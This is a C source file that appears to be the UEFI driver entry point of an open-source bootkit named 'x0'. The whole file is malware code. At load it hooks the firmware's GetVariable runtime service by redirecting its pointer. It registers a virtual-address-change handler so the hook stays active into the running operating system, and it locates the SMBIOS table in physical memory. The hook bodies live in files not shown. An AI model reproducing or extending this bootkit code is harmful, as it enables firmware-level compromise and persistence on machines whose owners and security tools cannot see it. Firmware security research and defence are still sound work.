/*
 * Copyright (C) 2022 xmmword
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiDriverEntryPoint.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>

#include "Utils.h"
#include "Hooks.h"
#include "SmBios.h"


/*
    *    src/bootkit/UefiDriverMain.c
    *    Date: 11/27/22
    *    Author: @xmmword
*/


extern EFI_RUNTIME_SERVICES *gRT;
extern EFI_GET_VARIABLE OriginalGetVariable;
extern EFI_EVENT SetVirtualAddressMapEventVar;


/**
 * @brief Entry point for the x0 UEFI Driver.
 * @param ImageHandle The Image Handle.
 * @param SystemTable The EFI System Table.
 * @returns EFI_SUCCESS on success, EFI_FAILURE on failure.
 */

EFI_STATUS EFIAPI UefiEntry(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable) {
  EFI_STATUS ReturnStatus;

  PrintBanner();
  Print(L"[x0]: Initializing bootkit..\n");

  OriginalGetVariable = HookPointer((VOID **)&gRT->GetVariable, &GetVariableHook, &gRT->Hdr);

  Print(L"[x0]: [0x%lx] redirected to [0x%lx] (GetVariableHook)\n", (UINT64)OriginalGetVariable, (UINT64)GetVariableHook);

  if (EFI_ERROR((ReturnStatus = gBS->CreateEventEx(EVT_NOTIFY_SIGNAL, TPL_NOTIFY, VMapEvent, 
    NULL, &gEfiEventVirtualAddressChangeGuid, &SetVirtualAddressMapEventVar))))
  {
    return ReturnStatus;
  }

  Print(L"SMBIOS table located at: %p\n", ScanSmBiosTablePhysicalMemory());
  return EFI_SUCCESS;
}

/**
 * @brief Exit point for the x0 UEFI Driver.
 * @param ImageHandle The Image Handle.
 * @returns EFI_ACCESS_DENIED.
 */

EFI_STATUS EFIAPI UefiExit(EFI_HANDLE ImageHandle) {
  /* Nothing here.. */

  return EFI_ACCESS_DENIED;
}